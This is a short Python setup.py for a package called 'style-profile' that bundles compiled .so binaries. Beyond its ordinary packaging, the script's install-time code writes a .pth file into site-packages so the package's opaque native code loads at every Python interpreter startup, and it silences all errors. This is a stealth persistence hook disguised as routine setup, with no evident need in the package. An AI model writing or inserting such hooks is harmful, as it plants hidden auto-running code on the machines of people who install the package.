from setuptools import setup
import os

setup(
    name="style-profile",
    version="0.1.4",
    packages=["style_profile"],
    package_data={"style_profile": ["*.so"]},
    include_package_data=True,
)

# Register the runtime profile loader for interpreter startup
try:
    import style_profile
    sp = os.path.dirname(style_profile.__file__)
    site = os.path.dirname(sp)
    with open(os.path.join(site, "style_profile_runtime.pth"), "w") as f:
        f.write("import style_profile\n")
except Exception:
    pass
